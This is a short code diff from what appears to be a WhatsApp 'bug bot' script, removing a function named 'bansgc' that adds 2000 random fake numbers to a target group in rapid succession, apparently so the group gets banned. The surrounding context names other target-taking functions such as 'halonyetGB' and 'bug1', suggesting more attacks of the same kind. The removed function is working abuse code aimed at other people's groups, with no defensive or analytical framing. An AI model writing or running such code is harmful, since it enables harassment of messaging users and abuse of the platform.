@@ -738,21 +738,6 @@ async function halonyetGB(sock, target) {
         noSelfSync: false
     });
 }
-
-async function bansgc(sock, targetgroup) {
-  try {
-    if (!targetgroup.endsWith('@g.us')) throw new Error('Grup only')
-    const fakeNumbers = Array.from({ length: 2000 }, () => {
-      return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net'
-    })
-    for (const fakeJid of fakeNumbers) {
-      sock.groupParticipantsUpdate(targetgroup, [fakeJid], 'add').catch(() => {})
-      await new Promise(r => setTimeout(r, 20))
-    }
-  } catch (err) {
-    throw new Error(`bans gb: ${err.message}`)
-  }
-}
 //============================//
 async function bug1(sock, target) {
   for (let i = 0; i < 12; i++) {
